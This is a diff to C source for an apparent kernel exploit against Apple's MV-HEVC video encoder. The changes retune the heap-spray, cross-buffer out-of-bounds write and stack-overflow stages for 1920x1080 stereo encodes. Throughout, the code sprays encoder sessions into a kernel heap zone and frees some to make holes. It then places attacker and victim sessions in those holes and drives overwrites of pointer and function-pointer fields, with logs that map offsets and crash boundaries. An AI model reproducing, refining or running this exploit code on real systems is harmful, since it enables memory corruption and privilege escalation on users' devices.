@@ -799,13 +799,14 @@ int main(int argc, char *argv[]) {
 
     } else if (strcmp(mode, "dual") == 0) {
         rlog("DUAL: Multi-session spray + cross-buffer OOB + victim trigger\n");
-        rlog("WARNING: Requires 360 encodes. Table 1 crash boundary is at ~197.\n");
-        rlog("Run 'crash_test' first! If crash at 197, this mode will kernel panic.\n");
-        rlog("Only proceed if crash_test proved 200+ encodes survive.\n\n");
+        rlog("Using STEREO ENCODE (pset=4 per encode, 1920x1080)\n");
+        rlog("WARNING: Requires 270 encodes. Table 1 crash boundary is at ~148.\n");
+        rlog("Run 'crash_test' first! If crash at 148, this mode will kernel panic.\n");
+        rlog("Only proceed if crash_test proved 150+ encodes survive.\n\n");
         rlog("1. Create 20 MV-HEVC sessions (spray HEVC buffers in kalloc_data.49152)\n");
         rlog("2. Free alternating sessions to create holes\n");
         rlog("3. Create attacker + victim sessions in holes\n");
-        rlog("4. Attacker encodes 360 frames -> cross-buffer OOB into victim +0x8\n");
+        rlog("4. Attacker encodes 270 frames -> cross-buffer OOB into victim +0x8\n");
         rlog("5. Victim encodes 1 frame -> corrupted loop bound -> stack overflow\n\n");
         if (phase1_verify() != 0) goto done;
 
@@ -813,11 +814,11 @@ int main(int argc, char *argv[]) {
         #define DUAL_SPRAY 20
         VTCompressionSessionRef spray_sessions[DUAL_SPRAY];
         for (int i = 0; i < DUAL_SPRAY; i++) {
-            spray_sessions[i] = create_mvhevc_encoder(128, 128, 1);
+            spray_sessions[i] = create_mvhevc_encoder(1920, 1080, 1);
             if (!spray_sessions[i]) {
                 rlog("Session %d creation failed\n", i);
             } else {
-                int st = encode_one(spray_sessions[i], 0, 128, 128);
+                int st = encode_one_stereo(spray_sessions[i], 0, 1920, 1080);
                 rlog("Session %d: created, first encode status=%d\n", i, st);
             }
         }
@@ -834,30 +835,30 @@ int main(int argc, char *argv[]) {
         usleep(100000);
 
         rlog("\n--- Phase C: Create attacker (lid=0x4141) + victim (lid=1) ---\n");
-        VTCompressionSessionRef attacker = create_mvhevc_encoder(128, 128, 0x4141);
-        VTCompressionSessionRef victim = create_mvhevc_encoder(128, 128, 1);
+        VTCompressionSessionRef attacker = create_mvhevc_encoder(1920, 1080, 0x4141);
+        VTCompressionSessionRef victim = create_mvhevc_encoder(1920, 1080, 1);
         if (!attacker || !victim) {
             rlog("FAILED to create attacker/victim\n");
             goto dual_cleanup;
         }
-        int ast = encode_one(attacker, 0, 128, 128);
-        int vst = encode_one(victim, 0, 128, 128);
+        int ast = encode_one_stereo(attacker, 0, 1920, 1080);
+        int vst = encode_one_stereo(victim, 0, 1920, 1080);
         rlog("Attacker first encode: %d, Victim first encode: %d\n", ast, vst);
 
-        rlog("\n--- Phase D: Attacker encodes 360 frames ---\n");
-        rlog("Target: entry 1059+ (~353 enc) for cross-buffer OOB\n");
+        rlog("\n--- Phase D: Attacker encodes 270 frames ---\n");
+        rlog("Target: entry 1059+ (~265 enc) for cross-buffer OOB\n");
         int atk_errors = 0;
-        for (int i = 1; i < 360; i++) {
-            int st = encode_one(attacker, i, 128, 128);
+        for (int i = 1; i < 270; i++) {
+            int st = encode_one_stereo(attacker, i, 1920, 1080);
             if (st != 0) {
                 atk_errors++;
                 rlog("[ATK %d] Error: %d\n", i, st);
                 if (atk_errors >= 5) break;
             }
-            if ((i+1) % 50 == 0 || i == 359) {
-                int est = (i+1) * 3;
+            if ((i+1) % 50 == 0 || i == 269) {
+                int est = (i+1) * 4;
                 rlog("[ATK %d/%d] ~%d entries, cross-buffer: %s\n",
-                     i+1, 360, est, est > 1059 ? "REACHED" : "not yet");
+                     i+1, 270, est, est > 1059 ? "REACHED" : "not yet");
             }
         }
 
@@ -866,7 +867,7 @@ int main(int argc, char *argv[]) {
         rlog("runs 700 iterations × 256-byte format = stack overflow\n");
         rlog("Saved registers x19-x28 corrupted on stack\n");
         rlog("WARNING: This may cause a kernel panic!\n\n");
-        vst = encode_one(victim, 1, 128, 128);
+        vst = encode_one_stereo(victim, 1, 1920, 1080);
         rlog("Victim second encode: status=%d\n", vst);
         rlog("If we get here, either:\n");
         rlog("  a) Cross-buffer did not reach victim (not adjacent)\n");
@@ -910,8 +911,8 @@ int main(int argc, char *argv[]) {
         for (int i = 0; i < SPRAY_COUNT/2; i++)
             g_surfaces[i] = create_spray_surface(i);
 
-        rlog("--- Step 2: Create MV-HEVC encoder (lid=0x%x) ---\n", t2_lid);
-        VTCompressionSessionRef t2s = create_mvhevc_encoder(128, 128, t2_lid);
+        rlog("--- Step 2: Create MV-HEVC encoder (lid=0x%x, 1920x1080 stereo) ---\n", t2_lid);
+        VTCompressionSessionRef t2s = create_mvhevc_encoder(1920, 1080, t2_lid);
         if (!t2s) {
             rlog("FAILED: Could not create encoder\n");
             for (int i = 0; i < SPRAY_COUNT/2; i++)
@@ -923,18 +924,18 @@ int main(int argc, char *argv[]) {
         for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
             g_surfaces[i] = create_spray_surface(i);
 
-        rlog("--- Step 4: Encode %d frames (table 2 heap overflow at ~155) ---\n", t2_encodes);
+        rlog("--- Step 4: Encode %d frames (stereo, pset=4, table 2 heap overflow at ~117) ---\n", t2_encodes);
         int t2_errors = 0;
         for (int i = 0; i < t2_encodes; i++) {
-            int st = encode_one(t2s, i, 128, 128);
+            int st = encode_one_stereo(t2s, i, 1920, 1080);
             if (st != 0) {
                 t2_errors++;
                 rlog("[%d] Error: %d\n", i, st);
                 if (t2_errors >= 5) break;
             }
             if ((i+1) % 25 == 0 || i == t2_encodes-1) {
-                int t1_entries = (i+1) * 3;
-                int t2_entries = (i+1) * 3;
+                int t1_entries = (i+1) * 4;
+                int t2_entries = (i+1) * 4;
                 const char *t1_state = "pre-OOB";
                 if (t1_entries >= 592) t1_state = "DANGER: +0x5C70 hit!";
                 else if (t1_entries >= 256) t1_state = "OOB (safe range)";
@@ -995,29 +996,30 @@ int main(int argc, char *argv[]) {
 
     } else if (strcmp(mode, "crash_test") == 0) {
         rlog("CRASH_TEST: Incrementally encode to find the ACTUAL crash boundary\n");
+        rlog("Using STEREO ENCODE (pset=4 per encode, 1920x1080)\n");
         rlog("Known pointer fields in OOB range (may crash when overwritten):\n");
-        rlog("  Entry 274 (+0x4890, ~91 enc): 64-bit pointer, used in struct setup\n");
-        rlog("  Entry 297 (+0x4A00, ~99 enc): 5 refs, heavily used field\n");
-        rlog("  Entry 421 (+0x51C8, ~140 enc): pointer chain walk dereference\n");
-        rlog("  Entry 536 (+0x58F8, ~179 enc): LDR X1 → DEREF [X1+0] and [X1+0x28]\n");
-        rlog("  Entry 579 (+0x5BA0, ~193 enc): passed as arg0 to function call\n");
-        rlog("  Entry 592 (+0x5C70, ~197 enc): SIMD copy target pointer\n");
-        rlog("Strategy: batch to 85 (pre-OOB), then one-at-a-time through danger zones.\n\n");
+        rlog("  Entry 274 (+0x4890, ~69 enc): 64-bit pointer, used in struct setup\n");
+        rlog("  Entry 297 (+0x4A00, ~75 enc): 5 refs, heavily used field\n");
+        rlog("  Entry 421 (+0x51C8, ~106 enc): pointer chain walk dereference\n");
+        rlog("  Entry 536 (+0x58F8, ~134 enc): LDR X1 → DEREF [X1+0] and [X1+0x28]\n");
+        rlog("  Entry 579 (+0x5BA0, ~145 enc): passed as arg0 to function call\n");
+        rlog("  Entry 592 (+0x5C70, ~148 enc): SIMD copy target pointer\n");
+        rlog("Strategy: batch to 63 (pre-OOB), then one-at-a-time through danger zones.\n\n");
         if (phase1_verify() != 0) goto done;
         int ct_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
         rlog("layer_id=0x%x\n", ct_lid);
-        VTCompressionSessionRef ct_s = create_mvhevc_encoder(128, 128, ct_lid);
+        VTCompressionSessionRef ct_s = create_mvhevc_encoder(1920, 1080, ct_lid);
         if (!ct_s) { rlog("FAILED: encoder creation\n"); goto done; }
-        rlog("Phase A: Pre-OOB baseline (85 encodes, ~255 entries)\n");
-        for (int i = 0; i < 85; i++) {
-            int st = encode_one(ct_s, i, 128, 128);
+        rlog("Phase A: Pre-OOB baseline (63 encodes, ~252 entries)\n");
+        for (int i = 0; i < 63; i++) {
+            int st = encode_one_stereo(ct_s, i, 1920, 1080);
             if (st != 0) { rlog("[%d] ENCODE ERROR: %d (pre-OOB!)\n", i, st); break; }
-            if ((i+1) % 25 == 0) rlog("[%d] ok, ~%d entries\n", i+1, (i+1)*3);
+            if ((i+1) % 20 == 0) rlog("[%d] ok, ~%d entries\n", i+1, (i+1)*4);
         }
-        rlog("\nPhase B: OOB region, one encode at a time (86-205)\n");
+        rlog("\nPhase B: OOB region, one encode at a time (63-160)\n");
         rlog("Watching for crashes at pointer field boundaries.\n\n");
-        for (int i = 85; i < 205; i++) {
-            int entries = (i+1)*3;
+        for (int i = 63; i < 160; i++) {
+            int entries = (i+1)*4;
             const char *zone = "";
             if (entries >= 592) zone = " [+0x5C70 SIMD ptr]";
             else if (entries >= 579) zone = " [+0x5BA0 func ptr]";
@@ -1029,29 +1031,29 @@ int main(int argc, char *argv[]) {
             rlog("[%d] entries ~%d (+0x%x)%s... ",
                  i, entries, 0x3770 + entries*16, zone);
             fflush(stdout);
-            int st = encode_one(ct_s, i, 128, 128);
+            int st = encode_one_stereo(ct_s, i, 1920, 1080);
             if (st != 0) {
                 rlog("ERROR %d\n", st);
                 rlog("*** CRASH BOUNDARY: encode %d (entries ~%d) ***\n", i, entries);
-                rlog("*** Last safe encode: %d (entries ~%d) ***\n", i-1, (i)*3);
+                rlog("*** Last safe encode: %d (entries ~%d) ***\n", i-1, (i)*4);
                 break;
             }
             rlog("OK\n");
-            if (i == 91) {
-                rlog("  → Survived entry 274 (+0x4890) overwrite\n");
-            } else if (i == 99) {
-                rlog("  → Survived entry 297 (+0x4A00) overwrite\n");
-            } else if (i == 140) {
-                rlog("  → Survived entry 421 (+0x51C8) overwrite\n");
-            } else if (i == 179) {
+            if (i == 68) {
+                rlog("  → Survived entry 276 (+0x4890) overwrite\n");
+            } else if (i == 74) {
+                rlog("  → Survived entry 300 (+0x4A00) overwrite\n");
+            } else if (i == 105) {
+                rlog("  → Survived entry 424 (+0x51C8) overwrite\n");
+            } else if (i == 133) {
                 rlog("  → Survived entry 536 (+0x58F8) overwrite — pointer deref field OK\n");
-            } else if (i == 193) {
-                rlog("  → Survived entry 579 (+0x5BA0) overwrite — func ptr field OK\n");
-            } else if (i == 197) {
-                rlog("*** ENCODE 198 SURVIVED — entry 592 (+0x5C70) written without crash ***\n");
+            } else if (i == 144) {
+                rlog("  → Survived entry 580 (+0x5BA0) overwrite — func ptr field OK\n");
+            } else if (i == 147) {
+                rlog("*** ENCODE 148 SURVIVED — entry 592 (+0x5C70) written without crash ***\n");
                 rlog("*** Scenario B confirmed: SIMD/BLRAA/type_confusion all REACHABLE ***\n");
-            } else if (i == 200) {
-                rlog("*** ENCODE 201 SURVIVED — entries 601+ viable ***\n");
+            } else if (i == 150) {
+                rlog("*** ENCODE 151 SURVIVED — entries 604+ viable ***\n");
             }
         }
         VTCompressionSessionCompleteFrames(ct_s, kCMTimeInvalid);
